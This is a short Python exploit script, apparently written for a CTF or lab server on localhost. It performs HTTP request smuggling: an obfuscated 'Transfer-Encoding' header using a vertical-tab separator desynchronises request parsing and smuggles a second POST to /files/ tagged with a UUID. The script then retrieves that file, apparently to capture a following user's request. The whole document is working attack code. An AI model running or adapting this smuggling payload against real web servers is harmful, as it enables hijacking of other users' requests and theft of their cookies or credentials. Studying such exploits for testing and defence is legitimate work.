#/bin/python3
import socket
import time
import requests
import uuid

host = "127.0.0.1"
port = 10082

uid = str(uuid.uuid4())
payload = """POST / HTTP/1.1\r
Host: 127.0.0.1\r
Connection: keep-alive\r
Content-Length: {}\r
Transfer-Encoding:\x0bchunked\r
\r\n"""

body = """3\r
123\r
0\r
\r
POST /files/ HTTP/1.1\r
X-guid: %s\r
Content-Type: text/plain\r
Content-Length: 251\r
\r\n""" % uid


print('[*]Send:')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print(payload.format(len(body)) + body)
s.sendall((payload.format(len(body)) + body).encode('utf-8'))


print('[*]Receive:')
print(s.recv(1024))
s.close()


print('=======================')
time.sleep(2)
url = 'http://%s:%d/files/%s' % (host, port, uid)
print(url)
res = requests.get(url)

print(res.content)
